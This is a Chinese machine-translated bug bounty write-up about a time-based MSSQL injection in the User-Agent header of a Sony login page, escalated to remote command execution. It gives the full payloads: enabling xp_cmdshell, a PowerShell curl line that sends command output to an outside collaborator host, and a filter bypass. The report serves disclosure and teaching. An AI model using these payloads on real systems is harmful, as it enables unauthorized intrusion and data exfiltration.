<html>
<head>
<title>How I Escalated a Time-Based SQL Injection to RCE</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我如何将基于时间的SQL注入升级到RCE</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398?source=collection_archive---------0-----------------------#2021-10-17">https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398?source=collection_archive---------0-----------------------#2021-10-17</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="1271" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大家好！我希望你们都过得很好。</p><p id="bf14" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">今天，我将分享我的一份关于索尼<a class="ae kl" href="https://en.wikipedia.org/wiki/Sony" rel="noopener ugc nofollow" target="_blank">的报告，这是一个在</a><a class="ae kl" href="https://hackerone.com/" rel="noopener ugc nofollow" target="_blank"> HackerOne </a>中的公共程序，以及我如何将其从盲目的基于时间的SQL注入升级到完整的远程操作系统命令执行的方法。</p><p id="3aa0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我将编辑重要的细节，如域，子域，命令输出，我的IP地址，服务器IP地址，等等。</p></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><h1 id="6fe3" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated"><strong class="ak">侦查阶段:</strong></h1><p id="1b43" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">对于侦察阶段，我使用<code class="fe lw lx ly lz b">sublist3r</code>来查找给定域的子域。</p><figure class="mb mc md me gt mf gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/578346cdfebe8a75e4cbd949c3d9817c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1062/format:webp/1*aw693W2_liYo8amRjUN25A.png"/></div></figure><p id="39eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我检查了所有的子域，但都是死链接。失望之余，我尝试了其他侦察工具，比如<code class="fe lw lx ly lz b">amass</code>。令人惊讶的是，它给了我更好的结果</p><p id="fa1a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lw lx ly lz b">amass</code>给了我在简单的谷歌查询中看不到的子域名。(这个我就不截图了，抱歉)。它给了我一个这样的子域:<br/> <br/> <code class="fe lw lx ly lz b">special.target.com</code></p></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><h1 id="f041" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">熟悉目标</h1><p id="4e08" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">现在我访问了网站，它看起来像一个管理面板或员工登录页面</p><figure class="mb mc md me gt mf gh gi paragraph-image"><div class="gh gi mi"><img src="../Images/b9527b135e5c6a39c93640a47c9e2215.png" data-original-src="https://miro.medium.com/v2/resize:fit:1208/format:webp/1*tDUuZUE20u_8SCeqWQzMEg.png"/></div></figure><p id="e6af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试了经典的<code class="fe lw lx ly lz b">'</code>符号来检查sql错误。我进入了<code class="fe lw lx ly lz b">username=123'&amp;password=123'</code></p><p id="8c33" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我检查了burpsuite请求，端点返回了一个有意义的500错误页面。为什么硕果累累？开发人员忘记关闭他们的调试模式或什么的，这允许我查看完整的查询，以及文件的完整路径。</p><figure class="mb mc md me gt mf gh gi paragraph-image"><div class="gh gi mj"><img src="../Images/ae5541e38d42245320747bf0f9e12bd9.png" data-original-src="https://miro.medium.com/v2/resize:fit:824/format:webp/1*Ihnafl0WovT3OnnlczWZqQ.png"/></div></figure><p id="cf13" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该端点易受Microsoft SQL注入的攻击。</p></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><h1 id="6756" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">实际剥削</h1><p id="2935" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">我尝试对username参数进行简单的布尔SQL注入，但是没有成功。任何有效负载都显示错误。我再次查看查询错误，发现我的<code class="fe lw lx ly lz b">User-Agent</code>头被传递给了数据库。我给我的用户代理添加了单引号和注释<code class="fe lw lx ly lz b">‘--</code>，它返回了通常的正确页面。</p><p id="3ed5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lw lx ly lz b">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36<strong class="jp ir"><em class="mk">'--</em></strong></code></p><figure class="mb mc md me gt mf gh gi paragraph-image"><div class="gh gi ml"><img src="../Images/3249b78b7aa6a7d425dd501161013c2b.png" data-original-src="https://miro.medium.com/v2/resize:fit:918/format:webp/1*cMCp1P6aJ4sE6orXyzbqrw.png"/></div></figure><p id="32b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这很好地表明服务器执行用户提供的输入。接下来，我检查了基于时间的SQL注入，看是否可以堆叠查询</p><p id="2e02" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lw lx ly lz b">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36<strong class="jp ir"><em class="mk">';WAITFOR DELAY ‘00:00:05’;--</em></strong></code></p><p id="1d5d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那么响应会延迟大约5秒</p><figure class="mb mc md me gt mf gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/3124cd989cb39d5067bcfdf12deb8caa.png" data-original-src="https://miro.medium.com/v2/resize:fit:298/format:webp/1*DGXF39jeedtiWmk6Zvmzbw.png"/></div></figure><p id="9c5b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这证实了我们可以堆叠SQL查询并注入任何我们想要的命令。</p></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><h1 id="8132" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">将SQL注入升级到RCE</h1><p id="7f9d" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">既然我们知道我们可以堆栈查询，让我们在这里找到一种执行OS命令的方法。与MySQL不同，MSSQL提供了一种执行命令的方式。我基于<a class="ae kl" href="https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e" rel="noopener">Prashant Kumar</a><a class="mn mo ep" href="https://medium.com/u/8a66e9bc8058?source=post_page-----bbf0d68cb398--------------------------------" rel="noopener" target="_blank">的这篇</a>文章</p><p id="681d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我刚刚发现我们可以使用<code class="fe lw lx ly lz b">xp_cmdshell</code>执行操作系统命令，所以我在他们的服务器上启用了xp_cmdshell</p><p id="8f2b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lw lx ly lz b">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36<strong class="jp ir"><em class="mk">'; EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE;--</em></strong></code></p><p id="c4f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我用<code class="fe lw lx ly lz b">ping</code>测试了一个盲人RCE</p><p id="6e00" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lw lx ly lz b">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36<strong class="jp ir"><em class="mk">'; EXEC xp_cmdshell 'ping myburpcollablink.burpcollaborator.net';--</em></strong></code></p><figure class="mb mc md me gt mf gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mp"><img src="../Images/cc1cabc9b3e0183c12096b033a41ce3a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8nT-FzmI1u4buNIctaLvdQ.png"/></div></div></figure><p id="36d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嘣！我们找到了那个伪君子合作者的客户。这证实了我们可以做RCE。</p><p id="b8b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不像上面的<a class="ae kl" href="https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e" rel="noopener">将命令输出存储在数据库中，我采用了一种非破坏性的方式来读取OS命令输出。</a></p><p id="cd02" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我通过将输出分配给<code class="fe lw lx ly lz b">powershell</code>中的<code class="fe lw lx ly lz b">variable</code>并使用<code class="fe lw lx ly lz b">curl</code>将它们发送到我的BurpCollaborator来实现这个</p><p id="37dd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">工作原理是这样的:<br/> <code class="fe lw lx ly lz b">powershell -c “$x = whoami; curl <a class="ae kl" href="http://ryt2vq7j7b3jlk4zeilrk5hm7dd51u.burpcollaborator.net/get?output=$x" rel="noopener ugc nofollow" target="_blank">http://my-burp-link.burpcollaborator.net/get?output=$x</a>”</code></p><p id="8c9b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">上面的命令获得了<code class="fe lw lx ly lz b">whoami</code>的输出，并将它们发送到我的burpcollab链接</p><p id="cacc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">最终的RCE有效载荷看起来是这样的:</strong></p><p id="838a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lw lx ly lz b">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36<strong class="jp ir"><em class="mk">';EXEC xp_cmdshell ‘powershell -c “$x = whoami; curl </em></strong><a class="ae kl" href="http://gn76thrltjpf9j5jccvusaxpggm7aw.burpcollaborator.net/get?output=$x" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="mk">http://my-burp-link.burpcollaborator.net/get?output=$x</em></strong></a><strong class="jp ir"><em class="mk">"';--</em></strong></code></p><p id="f7d2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">命令输出如预期的那样返回给了我</p><figure class="mb mc md me gt mf gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi mu"><img src="../Images/c4b812f202a96125576afbd17ee57951.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cxBjzkOVwNe_JOCkkmGYpw.png"/></div></div></figure><p id="9a17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还可以检索他们的<code class="fe lw lx ly lz b">AWS EC2 instances’ metadata information</code>，查看服务器文件，等等。</p></div><div class="ab cl km kn hu ko" role="separator"><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr ks"/><span class="kp bw bk kq kr"/></div><div class="ij ik il im in"><h1 id="0cbc" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">绕过“修复”</h1><p id="0297" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">几天后，索尼告诉我他们部署了一个补丁。我尝试了我的旧有效载荷，它被防火墙阻止了。我看到他们的过滤器中包含了关键字<code class="fe lw lx ly lz b">EXEC xp_cmdshell</code>。</p><p id="9b9e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我通过声明一个值为<code class="fe lw lx ly lz b">xp_cmdshell</code>的变量<code class="fe lw lx ly lz b">@x</code>并做类似于<code class="fe lw lx ly lz b">EXEC @x</code>的事情来绕过过滤器</p><p id="2905" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lw lx ly lz b">‘; DECLARE <a class="ae kl" href="http://twitter.com/x" rel="noopener ugc nofollow" target="_blank">@x</a> AS VARCHAR(100)=’xp_cmdshell’; EXEC <a class="ae kl" href="http://twitter.com/x" rel="noopener ugc nofollow" target="_blank">@x</a> ‘ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net’ —</code></p><p id="66e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">时间线:</strong></p><ul class=""><li id="ec9a" class="mv mw iq jp b jq jr ju jv jy mx kc my kg mz kk na nb nc nd bi translated"><strong class="jp ir">2021年9月14日</strong> - &gt;首次报道</li><li id="876f" class="mv mw iq jp b jq ne ju nf jy ng kc nh kg ni kk na nb nc nd bi translated"><strong class="jp ir">2021年9月16日</strong> - &gt;被哈克松审判</li><li id="de63" class="mv mw iq jp b jq ne ju nf jy ng kc nh kg ni kk na nb nc nd bi translated"><strong class="jp ir">2021年9月21日</strong> - &gt;初始补丁部署(绕过)</li><li id="ae2e" class="mv mw iq jp b jq ne ju nf jy ng kc nh kg ni kk na nb nc nd bi translated"><strong class="jp ir">2021年9月23日</strong> - &gt;部署了另一个补丁(再次绕过)</li><li id="766d" class="mv mw iq jp b jq ne ju nf jy ng kc nh kg ni kk na nb nc nd bi translated"><strong class="jp ir">2021年9月26日</strong> - &gt;最终补丁部署完毕</li><li id="9436" class="mv mw iq jp b jq ne ju nf jy ng kc nh kg ni kk na nb nc nd bi translated"><strong class="jp ir">2021年9月27日</strong> - &gt;标记为已解决，并已获得奖金</li></ul><figure class="mb mc md me gt mf gh gi paragraph-image"><div role="button" tabindex="0" class="mq mr di ms bf mt"><div class="gh gi nj"><img src="../Images/f0d62b5ee2d087278cebc7353453a73c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6EeuSAczrCa-1JQ9dyLwCg.png"/></div></div></figure><p id="c0b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">非常感谢索尼让我们测试你的资产。谢谢你的礼物</p></div></div>    
</body>
</html>